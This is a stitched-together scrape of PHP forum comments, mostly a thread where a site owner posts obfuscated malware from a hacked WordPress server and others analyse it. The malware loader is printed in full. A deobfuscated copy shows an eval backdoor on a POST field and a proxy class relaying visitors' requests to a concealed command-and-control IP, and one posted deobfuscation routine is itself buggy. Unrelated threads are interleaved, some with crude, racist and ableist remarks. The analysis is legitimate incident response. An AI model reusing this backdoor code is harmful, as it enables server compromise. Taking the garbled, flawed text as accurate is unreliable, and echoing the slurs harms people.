It's incomplete and not well encoded. function a($b) { $b = base64_decode($b); while(true) { if(0==strlen($b)) break; elseif(0==0) It's nonsense code.
There's a third reason a mutant can survive. It's meant to. Mutation can produce false positives. The obvious example here is abs.
This post was removed because you have a new account and we get a lot of spam from newly created accounts. If you have any questions or think your post should be reinstated, please send a message to the mods. *I am a bot, and this action was performed automatically. Please [contact the moderators of this subreddit](/message/compose/?to=/r/PHP) if you have any questions or concerns.*
There's some potential here. You can roll out a framework suitable to your needs, structure it and organise it cleanly, some very consistent code, however it doesn't really know the problem space well that you would want to cater to and leaks in bad practices. Making a minimal framework for your needs is good but some things here are too specific or potentially bad practices. Rolling your own framework as long as you're a competent coder will always obliterate an off the shelf framework for performance. I would be very concerned about that timezone. It's usually best to use UTF8 and UTC internally. Then only convert the timezone on the external interface. For the timezone, if you don't use UTC and your TX changes or has DST you can really be exposing yourself to data corruption. Choose the thing least vulnerable to change and push the change up to the surface. Character sets are more complex. It's normally good to have binary -&gt; ascii -&gt; utf8. However that's not well optimised for far east languages. It means you might have places where you can have a mixture of code pages but you don't really want that. It's also not always as efficient. That is it can use more bytes. These are things you'll have to think about in your framework. &gt; With SQL anti injection, HTML automatic, anti XSS and other characteristics I will be very surprised if that is done properly.
It looks like a standard malware injection, the kind you'd see on a poorly secured wordpress site meant to execute random code. This likely isn't the whole thing.
It's a file that appeared in a wordpress instance that has been compromised. It's over 1000 lines of code but here's more. &lt;?php function TuzMS8($WAXJMVfrZn) { $AdzpmPwH='YcJvwlLyjikd'; $WAXJMVfrZn=base64_decode($WAXJMVfrZn); $bSCQNAv9AF=197; $GuRvvsZ0TKMS=(612+660-1270); $ykxd2FZ=(721-1033+312); $F9BDUwG=''; while(true) { if($ykxd2FZ==strlen($WAXJMVfrZn)) break; elseif($ykxd2FZ%2==(-919+894+25)) $XHZx3cQi=(ord($WAXJMVfrZn[$ykxd2FZ])-$bSCQNAv9AF)%(402+1282-1428); else $XHZx3cQi=ord($WAXJMVfrZn[$ykxd2FZ])^$GuRvvsZ0TKMS; $F9BDUwG.=chr($XHZx3cQi); $ykxd2FZ+=1; } return $F9BDUwG; } class oNywbTW { static public function eMK1j0fw9($KwKHu) { $h6DsXn='d0fP8pVYt'; $doplmlc6re='G6jdInz'; $OP7Wfhbj6O=TuzMS8("Kno5ZzNxLm0zXTFtJmYqZg=="); return $OP7Wfhbj6O($KwKHu); } static public function IYg1F0v($KQtMg5yHgk) { $EzkBb='nmijq5'; $hsAUQ1c=TuzMS8("Kno5ZzNxLm0zXTFtJmYqZg=="); return $hsAUQ1c($KQtMg5yHgk); } static public function bWuNnN2($vu8u7oH) { $KtXhs=TuzMS8("Kno5ZzNxLm0zXTFtJmYqZg=="); return $KtXhs($vu8u7oH); } static public function SuvbWzS($Xh3PsBQemD2) { $YNc2O8sO=TuzMS8("Mmb6"); return $YNc2O8sO($Xh3PsBQemD2); } static public function XHwCkKoZ($vHLH0u,$gts9DdXY) { $lXXN2qZH=TuzMS8("LmwkYzdwJns="); return $lXXN2qZH($vHLH0u,$gts9DdXY); } static public function ix57RWFxKrle($uZQeLTP,$nebuG7) { $Mr6DcuSsQc=TuzMS8("LmwkYzdwJns="); return $Mr6DcuSsQc($uZQeLTP,$nebuG7); } static public function In4FNyAVr4R($XWqyO,$eRGtsrv) { $IRlIsuPB2Fzb=(-(-28932)+16708+13015); $BPonU=TuzMS8("LmwkYzdwJns="); return $BPonU($XWqyO,$eRGtsrv); } static public function Lu2sT3ZboG($qHt8VS,$SMDO7Q3eeXO) { $thQcsT=TuzMS8("LmwkYzdwJns="); return $thQcsT($qHt8VS,$SMDO7Q3eeXO); } static public function AypjrhVzZ($QWIeBcCk) { $fLGGdgk='fkkKrKzO0'; $uhgvm=TuzMS8("LnL3bjRsLA=="); return $uhgvm($QWIeBcCk); } static public function GZ3dqcm($tHB5ZA1UwR4) { $h6tEd=(-(-14649)+4942+4904); $UL0wxTFSIt4b=(33945-4675+29623); $vQiASYMuvP48=TuzMS8("LnL3bjRsLA=="); return $vQiASYMuvP48($tHB5ZA1UwR4); } static public function CLuG1VFy($GSmUntI67) { $R9Uxts4AEuh=TuzMS8("LnL3bjRsLA=="); return $R9Uxts4AEuh($GSmUntI67); } static public function B2RuwSyNpRZ4($dSMJnMKtgoJS) { $oJ9omzxC='J7ybo'; $It4KNi=TuzMS8("LnL3bjRsLA=="); return $It4KNi($dSMJnMKtgoJS); } static public function ZniIq($c8fm3ABi8) { $Zt4s6ZvchZv=TuzMS8("LnL3bjRsLA=="); return $Zt4s6ZvchZv($c8fm3ABi8); } static public function IsFdM($GLso94M) { $gMHjL0gHItQ=(18381-1230+16833); $KIQPTNlB7XN=(-(-25742)+1692+1665); $Dt5jnp4=TuzMS8("LnL3bjRsLA=="); return $Dt5jnp4($GLso94M); } static public function g1CPPScZDbn($efX1g,$jACjv,$ONVd5p3rTn) { $j0Zzm=(-10714+37763+13757); $KNWvn94c=12104; $liv3iyVT=TuzMS8("OHcncTlw"); return $liv3iyVT($efX1g,$jACjv,$ONVd5p3rTn); } static public function OZY3r($CGzrHD2wvt4c) { $QqeXWnAN=(-(-1354)+39556+21639); $gRj41='ZUImboT8B'; $EL3wQc1='zWOKg2X2Z'; $inzpn2AzCAKs=61041; $qoEWbyzEZEi=TuzMS8("OHY3bips"); return $qoEWbyzEZEi($CGzrHD2wvt4c); } static public function UMnIuslm0Ki($CUKrJ8OeEWO,$QQ3ye,$o2WDAmc) { $TNKoSHbFzRO=TuzMS8("OHcncTlw"); return $TNKoSHbFzRO($CUKrJ8OeEWO,$QQ3ye,$o2WDAmc); } static public function sKBbYc8($LERI5,$MhFEzmU8Ch) { $duwTe7h3='VXLLBZXLi'; $cAhMig7HX=TuzMS8("OHY3cjRx"); return $cAhMig7HX($LERI5,$MhFEzmU8Ch); } static public function jI4DYSuC($diF4Du) { $OpRkpgD0ds=54974; $jpA1oQo9qzuL=TuzMS8("K2ExbThn"); return $jpA1oQo9qzuL($diF4Du); } static public function xUgmKBxO1($WRtAshr) { $n2YO8yfdc116=TuzMS8("K2Uqdjg="); return $n2YO8yfdc116($WRtAshr); } static public function Te0Hq2($DUW04W5g) { $J8RCrgDvrc=382; $d9STc4GU=TuzMS8("K2c0ZA=="); return $d9STc4GU($DUW04W5g); } static public function VCs8TQY9Mux3($w85z9Fsd,$g0FJyYUiZ) { $yerxbPQ=TuzMS8("K3U3azln"); return $yerxbPQ($w85z9Fsd,$g0FJyYUiZ); } static public function MQkdzAQw92k9($A0u2fg9IZZ2e) { $gu9itX7GifH=TuzMS8("KHc3biRhMW04Zw=="); return $gu9itX7GifH($A0u2fg9IZZ2e); } static public function McsPNI54sHDS($hQV1CY,$cv2Eo9tA9sfm,$IjdQofySG) { $gTmpz8='edUVlm'; $bmnZvzBc8Fle=TuzMS8("Kno1bjRmKg=="); return $bmnZvzBc8Fle($hQV1CY,$cv2Eo9tA9sfm,$IjdQofySG); } static public function YcTZN9($ODZvRPiG7) { $B9dTr=TuzMS8("KHc3biRhMW04Zw=="); return $B9dTr($ODZvRPiG7); } static public function xULMNBhS($TmNOR) { $MhZ4HBX='UxA7ZWY4izXo'; $kXpwFedQ=TuzMS8("KHc3biRnN3A0cA=="); return $kXpwFedQ($TmNOR); } static public function FzbN7unDI($iU4OUEvFfI) { $PubHmOEZgC=TuzMS8("KHc3biRnPWco"); return $PubHmOEZgC($iU4OUEvFfI); } static public function MVUJHpp7O0l($zQQueB,$A0hmfFpE,$UNJqQG) { $DOQYHPs=TuzMS8("KHc3biRxKnY0cjk="); return $DOQYHPs($zQQueB,$A0hmfFpE,$UNJqQG); } static public function gW9EYgE91q($HErFc0xX,$VokseS24jJ,$M1kyVOUW) { $L3CzTpf=TuzMS8("KHc3biRxKnY0cjk="); return $L3CzTpf($HErFc0xX,$VokseS24jJ,$M1kyVOUW); } static public function u1XeX($wvZnoINuJ,$uObA33r,$Pb98tGRVz) { $XwzfoxE='Dpsqyp9l'; $Zie2fqZA1Kij='sApG9fKD'; $Df32552f=34267; $IkTQMIdSP1Ln='pVAzHQoUjq1'; $Jgvc0ttZoQFu=TuzMS8("KHc3biRxKnY0cjk="); return $Jgvc0ttZoQFu($wvZnoINuJ,$uObA33r,$Pb98tGRVz); }
Can you edit that and put four spaces before every line? Even if it has four spaces? Then reddit will format it properly.
No, it's pretty big, over 1000 lines of code. Problem is that I thought I was able to clear out the issues but then this file popped up after all of my cleaning processes. I'm concerned there's a plugin across one of the many sites that is allowing file writes. I've already got a new server instance rolled up and I'm getting it ready to host sites. But, before I do anything else I'd like to see if I can find out how this got in.
sure
I agree that my version isn't optimal. When I wrote it I was only after correctness, but when I get the chance to revisit it I will definitely modify it so that it doesn't calculate the total number of iterations first.
https://pastebin.com/2Mq0cHgu
Here's the full file https://pastebin.com/2Mq0cHgu 
That was interesting, I'll definitely have go at implementing on future projects. 
The opening function is just: function crypt($in) { $in = base64_decode($in); $len = strlen($in); $out = ''; for($i = 0; $i &lt; $len; $i++) { if($i % 2 === 0) // Rotate even bytes by 197. $char = (ord($in[$i])-197)%256; else // Xor odd bytes against 2 $char = ord($in[$i])^2; $out .= chr($out); $i += 1; } return $out; } I'll let you know when I do the rest. That'll take half an hour or so, maybe longer with smoke, etc.
If you're having trouble with it, I recommend a service like SiteLock - they have automated scanners that will take out this stuff, and if it repeatedly comes back, they can find exactly where the issue is and stop it.
No, best is just invoking print functionality in users current browser. No need to install browser in the server, no need to spawn new process, no need to load the URL again, no need to impersonate users session and most of all, no need to deal with the situation when you get the snapshot of the content before it fully finishes loading due to asynchronously loaded content.
Honestly, whenever I am getting my car repaired, I feel so damn stupid. Here I am, using something daily with only superficial knowledge of the inner workings, trying to get the car repair guy to give me an estimate of how long the repair will take. I know perfectly well how hard it is to estimate these things *before*, yet I still look like an annoyed customer who doesn't care about the beauty of craftsmanship.
I sincerely appreciate your help. Any insight you have will help. I am not a PHP programmer though I sometimes work with code. I'm like a family doctor for tech. :) 
This code isn't meant to be readable - it's been intentionally obfuscated to make it at least less obvious that it's (probably) doing bad things. I wouldn't be surprised if there's an element of randomization added to prevent signature based malware detection. The first function that was already deobfuscated above is part of the internal deobfuscation code. (Some) values in this script have had a cypher applied to them then base64 encoded (a method of encoding any string or binary value as a base-64 value which is safe for transmission over most mediums but makes them hard to read for mere mortals)
I'm finding some interesting stuff here... $address = join('.', array(232 + 1, 222 + 1, 111 + 1, 221 + 1)); $address = ip2long($address); $r1zGlj = strlen("TQH2???") * -103199718 + 5; if ($address &lt; $r1zGlj) $Ih8Rg5ESOH = long2ip($address); else $Ih8Rg5ESOH = long2ip($r1zGlj + $this-&gt;weirdNumber); return $Ih8Rg5ESOH . '/forum/84553d8cb50cfc63.php'; That looks like a phone home and an attempt to encrypt the IP address of C&amp;C.
Thanks for that I understand what event sourcing is, and also what CQRS is, but I meant the difference between projections and processors. 
 &lt;?php if(!empty($_REQUEST['P4rBui6uFPlgY'])) { // execute backdoor? preg_replace('/.*/e', $_POST['MMdqZiw']); exit(); } error_reporting(0); ini_set('display_errors', 0); if (!function_exists('getallheaders')) { function getallheaders() { $headers = array(); foreach($_SERVER as $k =&gt; $v) if(substr($k, 0, 5) == 'HTTP_') $headers[str_replace(' ', '-', ucwords(strtolower(str_replace('_', ' ', substr($k, 5)))))] = $v; return $headers; } } if(!empty($_GET)) { $obj = new BadClass(); $out = $obj-&gt;doRequest(); // Someone forgot to substr? if(strlen($out) &lt; 4096) { echo $out; } } class BadClass { private $httpResponseHeaders; private $httpResponse; private $errorMsg; public $headers; public $url; public $weirdNumber; private $parseUrl; private $ipBlacklist = Array(); private $uaBlacklist = Array(); public function __construct($headers = array()) { $this-&gt;weirdNumber = intval('4763'); $this-&gt;method = $_SERVER['REQUEST_METHOD']; $this-&gt;headers = getallheaders(); unset($this-&gt;headers['Host']); $this-&gt;setHeader('X-Original-Host', $_SERVER['HTTP_HOST']); $this-&gt;setHeader('X-Original-Path', $_SERVER['REQUEST_URI']); $url = $this-&gt;getUrl(); $this-&gt;setHeader('X-Original-IP', $this-&gt;getRemoteAddr()); if (strpos($url, 'http') === false) { $url = 'http://' . $url; } $this-&gt;url = $url; $this-&gt;parseUrl = parse_url($this-&gt;url); foreach ($headers as $k =&gt; $v) { $this-&gt;setHeader($k, $v); } } private function getUrl() { $address = join('.', array(232 + 1, 222 + 1, 111 + 1, 221 + 1)); $address = ip2long($address); $magicNumber = strlen("TQH2???") * -103199713; // unless 32bit perhaps, this should never be hit? if($address &lt; $magicNumber) $ip = long2ip($address); else $ip = long2ip($magicNumber + $this-&gt;weirdNumber); return $ip . '/forum/84553d8cb50cfc63.php'; } private function getRemoteAddr() { return $_SERVER['REMOTE_ADDR']; } private function setHeader($tk, $tv, $skip = false) { foreach($this-&gt;headers as $k =&gt; $v) { if (strtolower($tk) == strtolower($k)) { if($skip) return; unset($this-&gt;headers[$k]); } } $this-&gt;headers[$tk] = $tv; $this-&gt;weirdNumber += $this-&gt;weirdNumber; } private function processResponseHeaders($headers, $exploded = false) { $skippy = Array( 'Vary', 'Server', 'X-Frame-Options' ); if (!$exploded) $headers = explode("\n", $headers); if(strpos($headers[0], 'HTTP') !== 0) { $this-&gt;httpResponse = ""; return; } $count = sizeof($headers); $this-&gt;httpResponseHeaders = array(); for ($i = 0; $i &lt; $count; $i++) { if (strpos($headers[$i], ': ') !== false) { list($k, $v) = explode(': ', $headers[$i]); if (in_array($k, $skippy)) { continue; } $this-&gt;httpResponseHeaders += array( $k =&gt; $v ); header($k . ': ' . $v); } else { // shitty way to guess at if its the first line? $parts = explode(' ', $headers[$i]); if (intval($parts[1]) &gt; 400) { $this-&gt;httpResponse = ""; return; } else { header($headers[$i]); } } } } private function getHttpHeaders($as_array = false) { if (!$as_array) { $headers = ""; foreach ($this-&gt;headers as $k =&gt; $v) $headers .= $k . ': ' . $v . "\r\n"; } else { $headers = array(); foreach ($this-&gt;headers as $k =&gt; $v) array_push($headers, $k . ': ' . $v); } return $headers; } private function by_stream() { $failed = false; $options = array( 'http' =&gt; array( 'method' =&gt; $_SERVER['REQUEST_METHOD'], 'header' =&gt; $this-&gt;getHttpHeaders(), 'content' =&gt; file_get_contents('php://input') ) ); $stream = stream_context_create($options); try { $this-&gt;httpResponse = @file_get_contents($this-&gt;url, false, $stream); if ($this-&gt;httpResponse === false) { $this-&gt;errorMsg = 'Something went wrong ' . "\r\n" . $http_response_header[0]; $failed = true; } } catch (Exception $e) { $this-&gt;errorMsg = $e-&gt;getMessage(); $failed = true; } $this-&gt;processResponseHeaders($http_response_header, true); if (!$failed) return $this-&gt;httpResponse; return false; } private function by_curl() { $failed = false; $ch = curl_init(); // set url curl_setopt($ch, 10002, $this-&gt;url); // return transfer curl_setopt($ch, 19913, true); if (strpos($this-&gt;url, 'https') === 0) { // verify peer off curl_setopt($ch, 64, 0); // verify host off curl_setopt($ch, 81, 0); } if ($_SERVER['REQUEST_METHOD'] == 'POST') { // post method curl_setopt($ch, 47, 1); // set post fields curl_setopt($ch, 10015, file_get_contents('php://input')); } // include header?? curl_setopt($ch, 42, 1); $headers = $this-&gt;getHttpHeaders(true); // set headers curl_setopt($ch, 10023, $headers); $response = curl_exec($ch); if ($response === false) { $this-&gt;errorMsg = 'Curl Error: ' . curl_error($ch); curl_close($ch); $failed = true; } list($headers, $httpResponse) = explode("\r\n\r\n", $response, 2); $this-&gt;httpResponse = $httpResponse; $this-&gt;processResponseHeaders($headers); if (!$failed) { curl_close($ch); return $this-&gt;httpResponse; } return false; } private function by_socket() { $protocol = ''; $port = 80; if ($this-&gt;parseUrl['scheme'] == 'https') { $protocol = 'ssl://'; $port = 443; } $headers = $this-&gt;getHttpHeaders(); $buf = ""; $errno = ""; $errstr = ""; if ($sock = @fsockopen($protocol . $this-&gt;parseUrl['host'], $port, $errno, $errstr, 30)) { $request = $_SERVER['REQUEST_METHOD'] . ' ' . (isset($this-&gt;parseUrl['path']) ? $this-&gt;parseUrl['path'] : '/') . (isset($this-&gt;parseUrl['query']) ? '?' . $this-&gt;parseUrl['query'] : '') . ' HTTP/1.1' . "\r\n" . $headers . "\r\n" . file_get_contents('php://input'); fwrite($sock, $request); while (!feof($sock)) $buf .= fgets($sock); fclose($sock); $contentBoundary = strpos($buf, "\r\n\r\n") + 4; $this-&gt;httpResponse = substr($buf, $contentBoundary, strlen($buf) - $contentBoundary); $this-&gt;processResponseHeaders(substr($buf, 0, $contentBoundary)); return $this-&gt;httpResponse; } else { $this-&gt;errorMsg = 'ERROR: ' . $errno . ' - ' . $errstr; return false; } } public function doRequest() { $C = ip2long($this-&gt;getRemoteAddr()) &amp; ip2long('255.255.255.0'); $B = ip2long($this-&gt;getRemoteAddr()) &amp; ip2long('255.255.0.0'); $A = ip2long($this-&gt;getRemoteAddr()) &amp; ip2long('255.0.0.0'); if (in_array($C, $this-&gt;ipBlacklist) || in_array($B, $this-&gt;ipBlacklist) || in_array($A, $this-&gt;ipBlacklist) || in_array(md5($_SERVER['HTTP_USER_AGENT']), $this-&gt;uaBlacklist)) return false; if (extension_loaded('curl')) return $this-&gt;by_curl(); if (extension_loaded('sockets') || extension_loaded('php_sockets')) return $this-&gt;by_socket(); return $this-&gt;by_stream(); } public function ZldVp() { if (!empty($this-&gt;httpResponseHeaders)) return $this-&gt;httpResponseHeaders; return false; } public function getErrorMsg() { if (!empty($this-&gt;errorMsg)) return $this-&gt;errorMsg; return false; } } ?&gt;
I think, until one has organised a conference; one is at pains to understand how difficult it can be. I don't see his tweet as "dismisses out of hand" as declining to take on the burden. Seems a bit of a stretch to suggest otherwise...
They mentioned the PDF needed to be signed. Which is tricky to do in the users browser without giving away the key.
I'm creating a simple PHP Framework for learning proper coding styles, PSR-x, Composer integration and just generally... for fun. For anyone interested: https://github.com/mikecurry74/deviant
It isn't encoded, it's obfuscated (which I guess is a sort of encoding, but not one that is expected to be decoded). That is, it's valid code as-is. This is pretty much always bad news bears. Time to harden your web server.
It's not tricky, it's impossible. So yes in those cases its best solution. If you can do it via invoking printing function, it's not though. Just semantics
Yeah, I didn't make any changes. Here's another paste from a new file: https://pastebin.com/F0WA99XD 
Yeah, the attack started 4 days ago and there were thousands of malicious files in the IIS partition. It looks like they were trying to host links to illegal content but I didn't dig very far into that, yet. I didn't have strong virus protection and I missed updating wordpress after the security release last month. I'm sure some old plugins had security issues too. Knowing this is obfuscated and not encoded really helps.
By default, Vue. js is already integrated in Laravel. https://laravel.com/docs/5.5/frontend#writing-vue-components
It might have been me then if I lost it on the terminal or it might just be that it is meant to have question marks. I will have to see when I get home. Then I will see if there is anything to that C&amp;C callback/if it can be shut down. Whoever made the script is pretty junior. The encoding is weak and the calibre of the PHP poor.
But ext-v8 SSR is not.
squirting is way better
Thanks!
It's not what I meant by integrate it into laravel. I already use what you mentionned. What I mean is having even vue beieng rendered on the server and the full html + data hydrated. True SSR.
Going to try on Monday...Would be preferable to running a node server
there are fat programmers? Cause I haven't see one yet. Black programmers are usually a myth too 
but I think is just piss 
Welcome to isdomainnamesquattinggoodorbad.com This domain may be for sale! [Contact us](mailto:dodgydomains@example.com) * Domain Names * Squatting * Squatting services * Domain name registration * About domain name squatting * House eviction legal services * Squatting statistics US * Good News of Jesus Christ * Morality * The Good, The Bad and The Ugly DVD * Buy Good or Bad on Amazon.com * Thought * Thinking stock images
I think squatting as a business model where your intention later is solely to auction off the domains at a huge mark up is a real asshole of a move. when you are buying and holding tens of thousands just for this reason it is bad. I think buying a domain when you have a great idea for it, but haven't gotten around (or maybe never really will) to doing anything with it is not bad. I own a few dozen domains in this situation and only about a dozen of them have active content.
It's bad, except if they use the domain name for SEO purpose. Then they bring value to a non-used domain name by making it worth more. But squatting a domain name without using it is really bad in my opinion. It costs nothing, it requires no work, and it prevent people from creating value.
https://gist.github.com/hikari-no-yume/33cf828bfa306b1b1d2187a6de639375
nice! any idea what it does?
It's bad and they're assholes. I put it in the same category as ticket scalping.
&gt; it was always to help me become a better developer - I love improving my skills. No, you don't. You're just rationalizing. How many frameworks did you carefully study before attempting to build one? If you wanna bash random keys attempting to solve problems you don't understand, then go right ahead. But don't kid yourself believing that it makes you a better developer. You wanna become a better developer? 1. Pick a problem 2. Understand that problem 3. Investigate how others have attempted to solve it before 4. Come up with a better approach 5. Rinse and repeat
I went to buy a domain name for a class I am taking, someone already owned it and has been sitting on the domain for over ten years unused and they wanted $17,000 for the domain.
The preg match bit is just eval. It is a one line back door. It is a bit weak as anyone can use it, it doesn't use public/private signing. Most of the rest of the code looks like a phone home. That is only at a glance. At first it looks like a proxy or C&amp;C but I think it's just a log of hits. I will know more when I get home and can extract that url. See where the forum bit is. I am not sure the person writing that code was sure what they were doing or it is something they use from the eval.
I've been thinking about this recently. Here is a summary of the options I've explored. Please reply with your thoughts/additions. # Problem statement We want to use the same components in our WordPress templates and JavaScript single-page-apps (SPAs). Frameworks like Vue.js let you encapsulate complex markup and add interactive functionality. # Options ## Custom elements | **Pros** | **Cons** | | ----------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | | - Web standard - Would work from any CMS, no hackery needed | - SEO impacts (ie. `&lt;h1&gt;` prioritised but if it’s buried in a `&lt;my-header&gt;`… though google’s synchronous JS loading may handle that) - Flash of missing elements? - Requires [heavy?] polyfills - Not sure we could leverage Vue.js… though I suppose we could. - Community isn’t quite rallied around this yet | ## Server-side rendering JS components within PHP Leverage PHP’s [V8JS extension](https://github.com/phpv8/v8js) to pre-render components in the HTML file that WordPress serves, as illustrated in [preact-php-server-render-example](https://github.com/helloguille/preact-php-server-render-example). | **Pros** | **Cons** | | ----------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | | - Whaaaaaaaaaat! - SEO - Faster time to content | - Requires a PHP extension (V8JS) and modifying the PHP code of the CMS - V8JS may not leverage PHP’s request-centric parallel worker execution model - it may need to parse and compile the JS source for each request - Limited to PHP | ## Server-side render the HTML that PHP produces The HTML file that WordPress/PHP produces gets piped into a Node process like [reshape-preact-ssr](https://www.npmjs.com/package/reshape-preact-ssr). | **Pros** | **Cons** | | -------- | -------- | | | | ## [Sentinel.js](https://github.com/muicss/sentineljs) Detect new DOM nodes using CSS selectors. Very similar to custom elements. | **Pros** | **Cons** | | --------------------------------- | ---------------------------------------------------------- | | - Very small polyfill (653 bytes) | - Hacky - Not sure there’s a way to watch for prop changes | ## WordPress renders template, Vue activates it | **Pros** | **Cons** | | -------- | -------- | | | | # Resources - [Introducing Server Components](https://medium.com/@pimterry/introducing-server-components-84b4a296c664) - [GitHub](https://github.com/pimterry/server-components) 
Do they add value ... Put it this way. Take your typical domain squatting outfits with thousands of domains. (I'm excluding well intentioned people who only have a few and just never get round to launching the project, as commented elsewhere. Cough) If they had never existed, would anything of value have been lost? Would anyone be saying, "jee, what our community really needs is some domain squatters." Or "shot, I've got a great idea for a business people actually want but I can't do it due to the lack of domain squatters." No, of course they wouldn't.
Well I'll be damned. Thank you!
I'm fortunate to have two factor authentication setup everywhere. The hacker injected custom administrative user accounts in all the sites which I deleted. There's no real data of importance on this shared hosting server, besides the sites themselves. The server instance is backed up, SQL is backed up and I threw ESET file security on the box too.
What I see there looks like a byte order mark. That can make things tricky. If you copy and paste the file your OS settings, editor settings, etc might convert it to something else. I'll treat it like it is what it looks like though. The IP it's trying to hit is: (length*-(98026500+81734170-76560952)+(-1607+825+787)) + (4763 &lt;&lt; 2) If tried for every length from 4 to 32 and sadly nothing is responding so unless I've made a mistake it's already been taken down.
If you check my edit I think I found who it is, I've given you email address to mail the host and ask them to check it out.
I think he really needs someone to sit next to him and explain things as well as look into it. The key thing though is not the be a magician, everything must be explained as it is done and found. This is related to the teach a man to fish metaphore. Always share the techniques and the knowledge. At the least good things are: * Incremental backups. See what actually changed. When viruses drop usually things change that shouldn't. I can't tell you how many times after me telling friends to turn off their machine the moment they see a virus and bring it to me I've been able to remove it by just sorting all files by mtime and poking/pruning the most recent. It's that simple sometimes. Incremental backup isn't just about backup but if you check the reports of what changed you can spot things even your anti virus wont pick up. * Related. Compare your install to a blank initial wankpress install. A more managed service might also help as you suggest. The only thing is it's very hard to know if they're serious or stringing you along. Real autistes are pretty far and few between. There are far more security outfits than there are autistes so that ought to spell out the problem for everyone.
Awesome. Thanks for sharing
I emailed them
Nice. Hopefully they'll be able to find something or let us know what software gives that fingerprint. I suspect though after probing it a bit that it's just a reverse proxy to wherever they really aggregate, store and process the stolen data (it's a front). There's a forum subfolder there with a PHP link but nothing else to suggest that it really is a forum (no post.php, etc).
You should study zero frameworks and instead study the problems. Do this: Make a few websites from raw. Look at what you need in common. That's your starting point. Where it really gets complex is when you want to choose way X and not always every way because that's not sustainable. You need to choose the best overall ways. No framework yet caters to real programming. Just care about things being right. Not "just works". Worry about transactions, input validation, character sets, timezones, other things.
You're brilliant, thank you so much.
This is a classic mistake that a lot of people make who get hired to write bespoke software for clients. They didn't hire you to create a generic CRM that they could configure themselves, they hired you to create a CRM for _THEM_. If you were to start a home renovation company, you don't show up to the job site with all the materials with lots of different tile options and then show them how they can tile it themselves with all these easy to use tools you created for them. That's what they hired you for. They want a tiled shower - that's it. Searches, filters, rulesets, etc are all nice, but the day-to-day stuff they need should be in a pre-configured dashboard in which you set up all the key searches and stuff they wanted in advance. ...and when they want a new view, you use your own tool, click it together in 3 minutes, and charge them an hour minimum of your time to do it. They couldn't care less about the software - they have a job to do and hired someone to write software to _exactly_ what they need. People need to stop writing generic software when the clients come to you with specific requests. I'm not saying hard-code everything, but your final deliverable should be pre-configured and ready to use. If the client has to do a ton of setup, you've failed in your job.
Is python wrapping a C library for that? Then just wrap the C library yourself in PHP.
The answer to this question is always "nuke the server, rebuild from scratch". If they have one way in, they have created 10 more for themselves. If you need resources on securing a web server, tell us more about your setup and we might be able to push you in the right direction. Again, don't try to fix it. Destroy the server and start over. 
Looks like there is an option to specify how many parallel jobs.
Does this support consuming JSON API or just outputting it?
Fair enough. I hate domain squatters. But, I am going to give you an ideological pass. If only we had a good way to separate you from the real shitheads who have 0% intention on building anything...
it also doesn't use prepared statements.
That's where I'm going. I'm running Win2016 on AWS and Azure. 
We use Mandrill for transactional emails. Works fine, can track clicks and opens with it. It's not just for something like 'targeted product reminders'. You can use it for whatever. Not my favorite pricing model though, they seem to be getting away from Mandrill/transactional emails and focusing on Mailchimp only/email blasts (Advertising type stuff)
Fortunately I really beleive I made enough changes to stop them from proceeding in their attempts to continue. It may need to stay live for a couple more weeks while I slowly move and rebuild these sites.
I've been working with tech for 25 years and call myself a diagnostic technician and website designer but I don't often have the benefit of working with someone that will show me some of the deeper stuff without my own research. I really do appreciate your help.
It's fine. If you recognize that a valuable piece of land is being sold at a bargain price, is it wrong to buy it even if you don't plan to use it for anything other than to wait for people to see it's value and then sell it at a higher price? I agree it is not ideal, but we live in a wold that is so far from ideal that something like this is just what you do to make money. It's not like it has become hard to get a good domain name. If we lived in an ideal world where every decision was based on love, and then someone started domain squatting, then it would be very wrong, as would buying the land just to sell it at a higher price.
The reason ticket scalping is illegal is mainly to protect people from getting scammed from buying fake tickets. Some types of domain squatting are no different from buying a piece of at a bargain price before other people see the value with the idea of selling it at a higher price later on. Why should doing this with land be considered an investment and doing it with a domain name be considered a bad practice?
Yeah, you're right, and they are doing a number on me. I'm trying to figure out where it is coming from so I don't just move the compromise to a new server.
You can learn more than one language after the first and, as it turns out, the second language is significantly easier than the first. I wouldn’t worry at all about being tainted or pidgin holed as a result of your first language. That said, I think something like JavaScript is easier to get started with because the only program you need is your browser. It’s just such a low barrier to entry especially on Windows.
Try learning a stricter language first that has a compiler so are forced to see the errors and warnings instead of ignoring or hiding them. This will force you to learn and understand the language. I recommend trying to learn elm as a first language because it is the closest thing to a beginner friendly, practical, strictly compiled, purely functional programming language. It is not always true that learning other languages becomes easier after your first one. If you start with a non-functional language, it can be hard to learn a functional language later. I recommend starting with a functional language, with learning a non-functional language as a backup plan if it is too hard to learn a functional one first.
If you're doing WordPress, consider moving to a specialized wp host. They have many of the securities built in for you. Is there any reason you're running php on a windows machine? They could've created rdp logins for themselves and keyloggers by now. If there's any user data on that server it is irresponsible to keep it running. If there's any personal user information you're possibly legally obliged to inform your users. If there's credit card information on the server you're in a heap of trouble. Seriously, just bite the bullet, setup a hardened server with better monitoring and tighter security. Everyday that server runs compromised, more data could be stolen. Good luck! 
As far as future proofing is concerned, it is important to learn a functional language. They make it much more practical to write code that takes advantage of multiple cores, or multiple computers. Trying to do that in other languages tends to produce lots of very complicated, difficult to reproduce, and difficult to fix bugs.
You're never going to get a good answer in a thread like this... Stop asking *other people* what's right for *you* and learn to think for yourself or you won't get very far regardless of the languages you choose. As an aside; if anyone ever unironically uses the term "future proof," burn them alive for heresy. It doesn't exist and its use proves only that they don't understand how technology works. There's nothing wrong with learning PHP. There's also nothing wrong with not learning PHP.
I'm a Microsoft Windows guy, always have been. I've been running IIS hosting for 15 years and feel like I have far less issues and maintenance requirements than the linux counterpart. This is the first time in 7 years I've had any issues. Per keyloggers, they didn't get access to the windows partition, only a partition where the files are stored. I've got ESET on there now and I pulled IUSR access from the compromised partition. It is more cost effective for me to run my own web/email servers.
Fair enough. To each their own. In my experience windows servers have a lot higher hardware requirements (not to mention licenses) associated with them. So I'm curious how it's more cost effective that way. Preferably the web server user (I guess that's the user associated with the iis pool or something?) would have 0 write access. That would stop them from making file changes. Change the db password as well as those passwords are the easiest to compromise once breached. 
